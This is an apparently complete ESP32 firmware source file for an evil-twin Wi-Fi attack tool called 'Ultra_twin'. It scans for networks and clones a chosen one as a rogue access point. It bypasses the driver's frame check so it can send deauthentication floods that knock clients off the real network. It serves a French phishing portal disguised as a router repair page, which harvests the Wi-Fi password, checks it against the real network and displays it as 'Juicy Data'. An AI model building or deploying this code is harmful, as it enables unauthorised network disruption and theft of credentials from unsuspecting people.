#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include <DNSServer.h>
#include <cstdint>
#include <cstdlib>
#include <esp_wifi.h>
#include <unistd.h>
#include "HardwareSerial.h"
#include "WString.h"
#include "esp32-hal.h"
#include "esp_wifi_types.h"
#include <esp_task_wdt.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define WDT_TIMEOUT 30
#define SCREEN_I2C_ADDR 0x3c // or 0x3C
#define SCREEN_WIDTH 128     // OLED dis width, in pixels
#define SCREEN_HEIGHT 64     // OLED dis height, in pixels
#define FRAME_COUNT (sizeof(frames) / sizeof(frames[0]))
#define OLED_RST_PIN -1      // Reset pin (-1 if not available)
#define maxn 20
#define LED_PIN 2
#undef ieee80211_raw_frame_sanity_check

Adafruit_SSD1306 dis(128, 64, &Wire, OLED_RST_PIN);
DNSServer dnsServer;
AsyncWebServer server(80);
// globa arrays var
uint8_t ev_mac[6];
uint8_t bssids[maxn][6];
uint8_t bssid[6];
// globale string var
String ssid;
String ssid_new;
String password;
String macStr;
String ssids[maxn];
// global bool var
bool start_attack = true;
bool oled = true;
bool print = true;
bool sca_status = true;
bool Pass_check;
bool is_mac;
bool start_dns = false;
bool writing = true;
// global int var
int total;
int ind;
int ch[maxn];
int channel;
int reason;
int eliminated_stations = 0;  // Track how many stations are eliminated
int cx = 0 ;
int frame = 0;

// Deauthentication frame structure
typedef struct {
    uint8_t frame_control[2] = { 0xC0, 0x00 };
    uint8_t duration[2];
    uint8_t station[6];
    uint8_t sender[6];
    uint8_t access_point[6];
    uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
    uint16_t reason;
} deauth_frame_t;
// Connection parts structure
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t sequence_ctrl;
    uint8_t addr4[6];
} mac_hdr_t;
// packet
typedef struct {
    mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_packet_t;
// filter
const wifi_promiscuous_filter_t filt = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

deauth_frame_t deauth_frame;


extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;  
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
const byte PROGMEM frames[][512] = {
    {0,0,0,0,0,0,0,0,0,0,0,0,0,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0,0},
    {0,0,0,0,0,0,0,0,0,0,0,0,0,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0,0},
    {0,0,0,0,0,0,0,0,0,0,0,0,0,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0,0},
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    {0,0,0,0,0,0,0,0,0,0,0,0,0,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0,0}
};

String index_html = "<!DOCTYPE html>"
"<html lang=\"fr\">"
"<head>"
"    <meta charset=\"UTF-8\">"
"    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
"    <title>Erreur de Connexion</title>"
"    <style>"
"        /* Global Reset */"
"        * {"
"            margin: 0;"
"            padding: 0;"
"            box-sizing: border-box;"
"            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;"
"        }"
"        body {"
"            dis: flex;"
"            align-items: center;"
"            justify-content: center;"
"            min-height: 100vh;"
"            background: #f4f7fc;"
"            padding: 20px;"
"            animation: fadeIn 1s ease-out;"
"        }"
"        .container {"
"            background-color: #fff;"
"            border-radius: 12px;"
"            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.1);"
"            padding: 40px;"
"            width: 100%;"
"            max-width: 480px;"
"            text-align: center;"
"            color: #333;"
"        }"
"        .ssid-container {"
"            font-size: 18px;"
"            font-weight: bold;"
"            color: #333;"
"            margin-bottom: 20px;"
"        }"
"        .ssid-container span {"
"            color: #333;"
"            dis: block;"
"            font-size: 20px;"
"            margin-bottom: 5px;"
"        }"
"        .mode-text {"
"            font-size: 16px;"
"            font-weight: normal;"
"            color: #FF6347;"
"        }"
"        .icon {"
"            font-size: 60px;"
"            margin-bottom: 20px;"
"            animation: bounceIn 1s ease-in-out;"
"        }"
"        h1 {"
"            color: #ff6347;"
"            margin-bottom: 15px;"
"            font-size: 28px;"
"            font-weight: 600;"
"        }"
"        p {"
"            color: #555;"
"            margin-bottom: 20px;"
"            font-size: 16px;"
"            line-height: 1.6;"
"        }"
"        label {"
"            dis: block;"
"            text-align: left;"
"            margin-top: 15px;"
"            font-size: 14px;"
"            color: #333;"
"            font-weight: bold;"
"        }"
"        input {"
"            dis: block;"
"            width: 100%;"
"            padding: 12px 18px;"
"            margin-bottom: 18px;"
"            font-size: 16px;"
"            border: 1px solid #ddd;"
"            border-radius: 8px;"
"            background-color: #fafafa;"
"            color: #333;"
"        }"
"        button {"
"            padding: 14px;"
"            border-radius: 8px;"
"            border: none;"
"            color: #fff;"
"            cursor: pointer;"
"            background-color: #4CAF50;"
"            width: 100%;"
"            font-size: 16px;"
"        }"
"        button:hover {"
"            background-color: #45a049;"
"        }"
"        .footer {"
"            margin-top: 30px;"
"            font-size: 12px;"
"            color: #777;"
"        }"
"        .footer a {"
"            color: #777;"
"            text-decoration: none;"
"        }"
"        .footer a:hover {"
"            color: #333;"
"            text-decoration: underline;"
"        }"
"    </style>"
"</head>"
"<body>"
"    <div class=\"container\">"
"        <div class=\"ssid-container\">";

const String wrong_pass = R"rawliteral(
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mot de passe incorrect</title>
    <style>
        /* Global reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            dis: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #e9f4fb;
            padding: 20px;
            animation: fadeIn 1s ease-in-out;
        }

        /* Fade-in effect for the container */
        .container {
            background-color: #fff;
            border-radius: 15px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            padding: 40px;
            width: 100%;
            max-width: 450px;
            text-align: center;
            color: #333;
            opacity: 0;
            animation: fadeIn 1s ease-in-out forwards;
            /* Animation for fading in */
            dis: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        h1 {
            color: #FF3B30;
            font-size: 32px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        p {
            color: #555;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        /* Red countdown styling */
        .countdown {
            font-size: 24px;
            font-weight: bold;
            color: #FF3B30;
            /* Red color for countdown */
        }

        /* Button Style */
        button {
            padding: 12px;
background-color: #4CAF50;
color: white;
border: none;
border-radius: 8px;
font-size: 16px;
cursor: pointer;
width: 100%;
transition: background-color 0.3s ease;
}

button:hover {
           background-color: #45a049;
       }

/* Animation for fade-in */
@keyframes fadeIn {
    0% {
opacity: 0;
    }

    100% {
opacity: 1;
    }
}

/* SVG icon style */
.icon {
width: 60px;
height: 60px;
        margin-bottom: 20px;
color: #FF3B30;
       /* Red color for the icon */
}
</style>
</head>

<body>
<div class="container">
<!-- SVG Icon centered -->
<div class="icon">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
stroke="currentColor" class="size-6">
<path stroke-linecap="round" stroke-linejoin="round"
d="M18.364 18.364A9 9 0 0 0 5.636 5.636m12.728 12.728A9 9 0 0 1 5.636 5.636m12.728 12.728L5.636 5.636" />
</svg>
</div>
<h1>Mot de passe incorrect</h1>
<p>Votre mot de passe est incorrect. Veuillez réessayer.</p>
<!-- Shortened redirection message -->
<p id="redirectMessage">Redirection dans <span id="countdown" class="countdown">5</span> secondes...</p>
<p>Si vous n'êtes pas redirigé automatiquement, <a href="/">cliquez ici</a>.</p>
</div>

<script>
// Initial countdown value
let countdown = 5;

// Update the countdown every 1 second
const countdownInterval = setInterval(function () {
        // Update the countdown number in the text
        document.getElementById("countdown").textContent = countdown;

        // Decrease the countdown
        countdown--;

        // When countdown reaches 0, redirect the user
        if (countdown < 0) {
        clearInterval(countdownInterval);  // Stop the countdown
        window.location.href = '/';  // Redirect to login page
        }
        }, 1000);
</script>
</body>

</html>
)rawliteral";

const String correct_pass = R"rawliteral(
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mise à jour du routeur</title>
    <style>
        /* Réinitialisation globale */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            dis: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #e9f4fb;
            padding: 20px;
            animation: fadeIn 1s ease-in-out;
        }

        /* Style du conteneur */
        .container {
            background-color: #fff;
            border-radius: 15px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            padding: 40px;
            width: 100%;
            max-width: 450px;
            text-align: center;
            color: #333;
            opacity: 0;
            animation: fadeIn 1s ease-in-out forwards;
            dis: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            /* Centering the content */
        }

        h1 {
            color: #4CAF50;
            font-size: 32px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        p {
            color: #555;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        /* Compte à rebours en vert */
        .countdown {
            font-size: 24px;
            font-weight: bold;
            color: #4CAF50;
        }

        /* Style du bouton */
        button {
            padding: 12px;
            background-color: #4CAF50;
color: white;
border: none;
border-radius: 8px;
font-size: 16px;
cursor: pointer;
width: 100%;
transition: background-color 0.3s ease;
}

button:hover {
           background-color: #45a049;
       }

/* Animation de fondu */
@keyframes fadeIn {
    0% {
opacity: 0;
    }

    100% {
opacity: 1;
    }
}

/* Style de l'icône SVG */
.icon {
width: 60px;
height: 60px;
        margin-bottom: 20px;
color: #4CAF50;
       /* Green color for the icon */
}
</style>
</head>

<body>
<div class="container">
<!-- SVG Icon centered -->
<div class="icon">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
stroke="currentColor" class="size-6">
<path stroke-linecap="round" stroke-linejoin="round"
d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244" />
</svg>
</div>
<h1>Succès</h1>
<p>La mise à jour du routeur est en cours. Veuillez patienter 30 secondes.</p>
<p>Le Wi-Fi sera rétabli sous peu.</p>
<!-- Message de compte à rebours -->
<p id="redirectMessage">Redirection dans <span id="countdown" class="countdown">30</span> secondes...</p>
</div>

<script>
// Valeur initiale du compte à rebours
let countdown = 30;

// Mise à jour du compte à rebours chaque seconde
const countdownInterval = setInterval(function () {
        // Met à jour le nombre du compte à rebours dans le texte
        document.getElementById("countdown").textContent = countdown;

        // Décrémente le compte à rebours
        countdown--;

        // Lorsque le compte à rebours atteint 0, redirige l'utilisateur
        if (countdown < 0) {
        clearInterval(countdownInterval);  // Arrête le compte à rebours
        window.location.href = '/';  // Redirection vers la page de connexion
        }
        }, 1000);
</script>
</body>

</html>
)rawliteral";
// vars
class CaptivePortalHandler : public AsyncWebHandler {
    public:
        CaptivePortalHandler() {}
        virtual ~CaptivePortalHandler() {}

        bool canHandle(AsyncWebServerRequest *request) {
            return request->url() == "/";
        }

        void handleRequest(AsyncWebServerRequest *request) {
            if (request->method() == HTTP_GET && request->url() == "/") {
                request->send(200, "text/html", index_html);
            } else {
                request->send(200, "text/html", index_html);
            }
        }
};
void logo(){
    dis.clearDisplay();
    dis.setCursor(0,0);
    dis.println("Welcome To");
    dis.println("        Ultra_twin :}");
    dis.display();

}
void printBSSID(uint8_t* bssid,int ln) {
    for (int i = 0; i < 6; i++) {
        if (i > 0) Serial.print(":");
        // Print each byte with two digits and uppercase HEX representation
        if (bssid[i] < 0x10) Serial.print("0");  // Add leading zero for values < 0x10
        Serial.print(bssid[i], HEX);
    }
    if (ln == 1){
        Serial.println();  // Move to the next line after printing
    }
}
void bar() {Serial.println("==============================================");}
// Sniffer callback function to capture packets in promiscuous mode
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_packet_t *sniffed_packet = (wifi_packet_t *)pkt->payload;
    const mac_hdr_t *mac_header = &sniffed_packet->hdr;

    const uint16_t pkt_length = pkt->rx_ctrl.sig_len - sizeof(mac_hdr_t);

    if (pkt_length < 0) return;

    // Check if the frame is from the target access point
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
        if (writing){
            cx++;
            String mac_destination = String(mac_header->dest[0], HEX) + ":" +
                String(mac_header->dest[1], HEX) + ":" +
                String(mac_header->dest[2], HEX) + ":" +
                String(mac_header->dest[3], HEX) + ":" +
                String(mac_header->dest[4], HEX) + ":" +
                String(mac_header->dest[5], HEX);
            String mac_source = String(mac_header->src[0], HEX) + ":" +
                String(mac_header->src[1], HEX) + ":" +
                String(mac_header->src[2], HEX) + ":" +
                String(mac_header->src[3], HEX) + ":" +
                String(mac_header->src[4], HEX) + ":" +
                String(mac_header->src[5], HEX);
            dis.setCursor(0,0);
            Serial.printf("Sniff : %d |", cx);
            Serial.print("Destination MAC: " + mac_destination + " | ");
            Serial.print("Source MAC: " + mac_source+ "\n");
            if (oled){
                dis.clearDisplay();
                dis.println(String("Sniff : " + String(cx) + "\n"));
                dis.println("+ Destination MAC:");
                dis.println("  " + mac_destination);
                dis.println("+ Source MAC:");
                dis.println("  " + mac_source);
                dis.println("\nNo pass? No problem:)");
                dis.display();
            }
        }
        memcpy(deauth_frame.station, mac_header->src, 6);
        for (int i = 0; i < 16; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
        }
        eliminated_stations++;
        //Serial.printf("Sent %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", 16,
        //                mac_header->src[0], mac_header->src[1], mac_header->src[2]);
        //                mac_header->src[3], mac_header->src[4], mac_header->src[5]);
        blink_led(2, 20);  // Blink LED as feedback
    }
}


// Blink LED function
void blink_led(int num_times, int blink_duration) {
    for (int i = 0; i < num_times; i++) {
        digitalWrite(LED_PIN, HIGH);  // Turn on the LED
        delay(blink_duration);        // Wait for the specified blink duration
        digitalWrite(LED_PIN, LOW);   // Turn off the LED
        delay(blink_duration);        // Wait again before the next blink
    }
}

// Start the deauth attack
void start_deauth(int wifi_number, uint16_t reason) {
    eliminated_stations = 0;
    deauth_frame.reason = reason;
    const uint8_t* bssid = WiFi.BSSID(ind);
    if (bssid == nullptr) {
        Serial.println("Error: Failed to get BSSID");
        return;
    }

    memcpy(deauth_frame.access_point, bssid, 6);
    memcpy(deauth_frame.sender, bssid, 6);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
    delay(1000);
}

void stop_deauth() {
    Serial.println("Stopping Deauth-Attack...");
    esp_wifi_set_promiscuous(false);
    dnsServer.stop();
    WiFi.disconnect();
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_STA);
    Serial.println("Deauth Attack Stopped");
    dis.println("Deauth Attack Stopped");
    logo();
    bar();
    Serial.printf("BTW (^_^) Here it s your Data \n\nSSID: %s\nPASSWORD: %s\n\n",ssid_new.c_str(),password);
    dis.println("BTW (._.) Your Data :");
    dis.println("=====================");
    dis.println(String("PASSWD: " + String(password)));
    dis.println("=====================");
    dis.display();
    Serial.println("(╬ Ò ‸ Ó) Do NOT lose them!");
    dis.println("(>_<) Don't lose it!!");
    dis.display();
    bar();
    Serial.print("(─‿─) Zzz Shutting down ESP32...");
    dis.println("(>_>) Zzz Shutdown...");
    dis.display();
    // sleep for 50 years
    sleep(1576800000);
}

// Deauth attack logic
void deauth(int network,int controle,int reason) {
    if (controle == 0) {  // Start the attack if not already attacking
        start_deauth(network, reason);  // Attack the first network (change as needed)
    } else if (controle == 1) {  // Stop the attack if it is running
        stop_deauth();
    }
}

bool connectToWiFi(String ssid,String password,int ch,uint8_t mac[6]) {
    WiFi.begin(ssid.c_str(), password.c_str(),ch,mac); // Connect to the user's Wi-Fi

    Serial.print("( -_-) Connecting to Wi-Fi");
    dis.println("(-_-) WiFi Connecting");
    dis.display();
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 4) {
        delay(1000);  // Wait for 1 second
        Serial.print(".");
        dis.print(".");
        dis.display();
        attempts++;
    }
    dis.println(" ");

    if (WiFi.status() == WL_CONNECTED) {
        oled = false;
        logo();
        Serial.println("\nConnected to Wi-Fi!!! (^‿^)");
        dis.println("WiFi Connected (^_^)");
        Serial.print("IP Address: ");
        Serial.println(WiFi.localIP());  // Print the local IP address
        dis.display();
        return true;
    } else {
        oled = false;
        logo();
        Serial.println("\nFailed to connect to Wi-Fi. ¯\\_(ツ)_/¯");
        dis.println("Failed to connect :(");
        dis.display();
        oled = true;
        return  false;
    }
    esp_task_wdt_reset();
    bar();
}

void macStringToArray(const String &macStr, uint8_t *macArray,int rng) {
    int values[6];
    if (macStr.length() != 17) {
        is_mac =  false;
    }

    sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    if (rng != 0) {
        values[4] = random(0, 256); // Random value for the 5th octet
        values[5] = random(0, 256); // Random value for the 6th octet
    }
    for (int i = 0; i < 6; i++) {
        macArray[i] = (uint8_t)values[i];
    }
    is_mac = true;
}
// max strings for line is 21 because 1 char takes 6 pixle that mean 21 * 6 = 126 < 128 pixle in total
int scan() {
    logo();
    Serial.print("Scanning for networks");
    dis.print("Scanning");
    dis.display();
    for (int i = 0 ; i <2 ; i++){
        Serial.print(".");
        dis.print(".");
        dis.display();
        delay(500);
    }
    int n = WiFi.scanNetworks(); // Scan for networks
    for (int i = 0 ; i <3 ; i++ ){
        Serial.print(".");
        dis.print(".");
        dis.display();
        delay(400);
    }
    Serial.println(" ");
    dis.println(String("\nTotale Networks : " + String(n)));
    dis.display();
    blink_led(3,200);
    if (n < 0) {
        Serial.println("Scan failed!");
        return 0;
    } else {
        for (int i = 0; i < n && i < maxn; i++) {
            ssids[i] = WiFi.SSID(i);
            memcpy(bssids[i], WiFi.BSSID(i), 6);
            ch[i] = WiFi.channel(i);

            Serial.print(i + 1); 
            Serial.print(") SSID: ");
            Serial.print(ssids[i]); // Print SSID
            Serial.print(" | BSSID: ");
            printBSSID(bssids[i],0);
            Serial.print(" | Channel: ");
            Serial.print(ch[i]); // Print channel
            Serial.printf(" | dBm : %4d", WiFi.RSSI(i));
            Serial.print(" | Security : ");
            switch (WiFi.encryptionType(i)) {
                case WIFI_AUTH_OPEN:
                    Serial.print("open");
                    break;
                case WIFI_AUTH_WEP:
                    Serial.print("WEP");
                    break;
                case WIFI_AUTH_WPA_PSK:
                    Serial.print("WPA");
                    break;
                case WIFI_AUTH_WPA2_PSK:
                    Serial.print("WPA2");
                    break;
                case WIFI_AUTH_WPA_WPA2_PSK:
                    Serial.print("WPA+WPA2");
                    break;
                case WIFI_AUTH_WPA2_ENTERPRISE:
                    Serial.print("WPA2-EAP");
                    break;
                case WIFI_AUTH_WPA3_PSK:
                    Serial.print("WPA3");
                    break;
                case WIFI_AUTH_WPA2_WPA3_PSK:
                    Serial.print("WPA2+WPA3");
                    break;
                case WIFI_AUTH_WAPI_PSK:
                    Serial.print("WAPI");
                    break;
                default:
                    Serial.print("unknown");
            }
            Serial.println(" ");

        }
        return n; // Return the number of networks found
    }
}
void setupServer(String &ssid) {
    server.addHandler(new CaptivePortalHandler()).setFilter(ON_AP_FILTER);

    // Handle all requests to serve the captive portal
    server.onNotFound([&](AsyncWebServerRequest *request) {
            request->send(200, "text/html", index_html); 
            });

    // Handle form submission using POST
    server.on("/submit", HTTP_POST, [&ssid](AsyncWebServerRequest *request) { // Capture ssid by reference

            if (request->hasParam("password", true)) { // true for POST parameters
            password = request->getParam("password", true)->value();
            writing = false;
            }

            // Print the received values to the Serial Monitor
            bar();
            logo();
            dis.println("======Juicy Data=====");
            Serial.println("\t Juicy Data \t");
            Serial.print("Password: ");
            Serial.println(password);
            dis.println(String("password : " + password));
            dis.println("=====================");
            bar();
            Pass_check = connectToWiFi(ssid_new,password,channel,bssid);
            writing = true;
            // Snd the response back to the client
            if (Pass_check){
                request->send(200, "text/html", correct_pass);
                start_dns= false;
                writing = false;
                delay(500);
                deauth(ind,1,reason);
            } 
            else if (!Pass_check) {
                request->send(200, "text/html", wrong_pass);
            }
    });
}
void sleep(int x) {
    esp_sleep_enable_timer_wakeup(x * 1000000); // 10 seconds
    esp_deep_sleep_start(); // Put the ESP32 into deep sleep
    Serial.println("Wake Up ESP32 !!! ");
}
void setup() {
    Serial.begin(115200);
    pinMode(LED_PIN, OUTPUT);
    //esp_task_wdt_init(WDT_TIMEOUT, true); //enable panic so ESP32 restarts
    //esp_task_wdt_add(NULL); //add current thread to WDT watch
    if (!dis.begin(SSD1306_SWITCHCAPVCC, SCREEN_I2C_ADDR)) {
        Serial.println(F("SSD1306 allocation failed"));
        for (;;); // Don't proceed, loop forever
    }
    dis.setTextSize(1);      // Normal 1:1 pixel scale
    dis.setTextColor(SSD1306_WHITE); // Draw white text
    dis.setCursor(0, 0);     // Start at top-left corner
    dis.setTextSize(1); 
    dis.clearDisplay();
    dis.display();
    blink_led(2,500);
}
void network_str(){
    esp_err_t result = esp_wifi_set_mac(WIFI_IF_AP, ev_mac);
    if (result == ESP_OK) {
        Serial.println("MAC address and SSID  set successfully");
    } else {
        Serial.print("Failed to set MAC address. Error: ");
        Serial.println(result);
    }
    IPAddress local_IP(192, 168, 1, 1);
    IPAddress gateway(192, 168, 1, 1);
    WiFi.channel(channel);
    if (!WiFi.softAPConfig(local_IP, gateway, IPAddress(255, 255, 255, 0))) {
        Serial.println("Failed to configure AP");
        return;
    }
    // Start the Access Point
    if (!WiFi.softAP(ssid)) { // Add a password for security
        Serial.println("Failed to start AP");
        return;
    }
    Serial.print("Setting up access point: ");
    Serial.println(ssid);
    Serial.println("Access Point started.");
    Serial.print("Mac : ");
    printBSSID(ev_mac,1);
    Serial.print("IP address: ");
    Serial.println(WiFi.softAPIP());

}
void start_ap(String ssid, uint8_t bssid[6]) {
    WiFi.begin(ssid.c_str(), password.c_str(),channel,bssid); // Connect to the user's Wi-Fi
    WiFi.mode(WIFI_MODE_APSTA);

    memcpy(ev_mac, bssid, sizeof(ev_mac));  // Copy the bssid into ev_mac
    do {
        ev_mac[5] = random(0, 256);  // Random value between 0 and 255 for the 6th byte
    } while (ev_mac[5] == bssid[5]);  // If it's the same as bssid[5], regenerate
    bar();
    Serial.println("Preperation (╯✧‿✧╯)");
    Serial.print("EV_BSSID: ");
    printBSSID(ev_mac,1);
    network_str();
    String macAddress = WiFi.macAddress();
    dnsServer.setTTL(7200);
    dnsServer.start(53, "*", WiFi.softAPIP());
    setupServer(ssid);
    server.begin();
    bar();
    String macd = String("MAC_") + String(ev_mac[0], HEX) + ":" +
        String(ev_mac[1], HEX) + ":" + String(ev_mac[2], HEX) + ":" +
        String(ev_mac[3], HEX) + ":" + String(ev_mac[4], HEX) + ":" +
        String(ev_mac[5], HEX);

    ssid_new = ssid;
    logo();
    dis.println("Staring AP : ");
    dis.print(ssid + "\n");
    dis.println(macd);
    Serial.println("Started Captive Portal...");
    dis.println("Captive Portal On...");
    dis.println("Deauth attack started");
    index_html += "<span id=\"ssid\">" + ssid_new + "</span>";
    index_html += 
        "            <div class=\"mode-text\">ACCESS POINT RESCUE MODE</div>"
        "        </div>"
        "        <div class=\"icon\">"
        "            <svg xmlns=\"http://www.w3.org/2000/svg\" fill=\"none\" viewBox=\"0 0 24 24\" stroke-width=\"1.5\" stroke=\"red\" width=\"200\" height=\"200\">"
        "                <path stroke-linecap=\"round\" stroke-linejoin=\"round\" d=\"M8.288 15.038a5.25 5.25 0 0 1 7.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 0 1 1.06 0Z\" />"
        "            </svg>"
        "        </div>"
        "        <h1>Oops ! Erreur de Connexion</h1>"
        "        <p>La connexion Wi-Fi est actuellement hors service.</p>"
        "        <p>Entrez votre mot de passe ci-dessous pour résoudre le problème et rétablir la connexion.</p>"
        "        <form action=\"/submit\" method=\"POST\">"
        "            <label for=\"password\">Mot de passe du routeur :</label>"
        "            <input type=\"password\" id=\"password\" name=\"password\" required placeholder=\"Entrez votre mot de passe\">"
        "            <button type=\"submit\">Réparer ma connexion</button>"
        "        </form>"
        "        <div class=\"footer\">"
        "            <footer>"
        "                <p>&copy; 2024. Tous droits réservés. <a href=\"#\">Politique de confidentialité</a></p>"
        "            </footer>"
        "        </div>"
        "    </div>"
        "</body>"
        "</html>";
    start_dns = true;
    Serial.println("Initiating Deauthentication Attack... (¬‿¬)");
    bar();
    dis.display();
    delay(1000);
    //deauth(ind,0,reason);
}
void loop() {
    if (frame < FRAME_COUNT){
        dis.clearDisplay();
        dis.drawBitmap(32, 0, frames[frame], 64, 64, 1);
        dis.display();
        frame++;
        delay(50);
    }
    else {
        if (start_attack){
            if (sca_status) {
                total = scan();
                sca_status = false; // Set scan status to indicate scanning is done
                Serial.println("!#>  ");
            }

            if (Serial.available() > 0) {
                String input = Serial.readStringUntil('\n');
                if (input.startsWith("rescan") || input.startsWith("res") || input.startsWith("rs")) {
                    sca_status = true; // Reset scan status to allow rescanning
                } else if (input.startsWith("custom") || input.startsWith("cust") || input.startsWith("cs")) {
                    Serial.println("Welcome To Custom Mode\nEnter SSID: ");
                    while (Serial.available() == 0) {}
                    ssid = Serial.readStringUntil('\n'); // Read SSID input

                    Serial.println("Enter BSSID: ");
                    while (Serial.available() == 0) {}
                    String bssidInput;
                    bssidInput = Serial.readStringUntil('\n'); // Read BSSID input
                    macStringToArray(bssidInput, bssid, 1);
                    while (!is_mac) {
                        Serial.println("Invalid BSSID format. Please enter a valid MAC address.");
                        while (Serial.available() == 0) {}
                        bssidInput = Serial.readStringUntil('\n'); // Read BSSID input
                        macStringToArray(bssidInput, bssid, 1);
                    }        
                    Serial.println("Enter Channel: ");
                    while (Serial.available() == 0) {}
                    String channelInput = Serial.readStringUntil('\n');
                    channel = channelInput.toInt(); // Convert input to integer
                    start_attack = false;
                }else if   (input.startsWith("sleep=") || input.startsWith("SLEEP=")) {
                    String sleepTime = input.substring(6);
                    int seconds;
                    sleepTime.trim(); // Remove any leading/trailing whitespace
                    seconds = sleepTime.toInt();
                    sleep(seconds); // Call the sleep function
                } else {
                    // Check if input is a valid number
                    int no = input.toInt();
                    ind = no - 1; // Adjust for 0-based index
                    if (input.length() > 0 && isDigit(input.charAt(0)) && total >= no && no > 0) {
                        ssid = ssids[ind];
                        channel = ch[ind];
                        memcpy(bssid,bssids[ind],sizeof(bssids[ind]));
                        start_attack = false;

                    } else {
                        logo();
                        Serial.println("Invalid input: " + input);
                        String msg = "Invalid input: " + input ; 
                        dis.println(msg);
                        dis.display();
                    }
                }
            }
        }
        else {
            if (print){
                Serial.println("");
                bar();
                Serial.println("DATA (⌐■_■) ");
                Serial.print("SSID: ");
                Serial.println(ssid);
                Serial.print("BSSID: ");
                printBSSID(bssid,1);
                Serial.print("Channel: ");
                Serial.println(channel);
                start_ap(ssid,bssid);
                print = false;

            }
        }
        if (start_dns){
            dnsServer.processNextRequest();
        }
    }
}
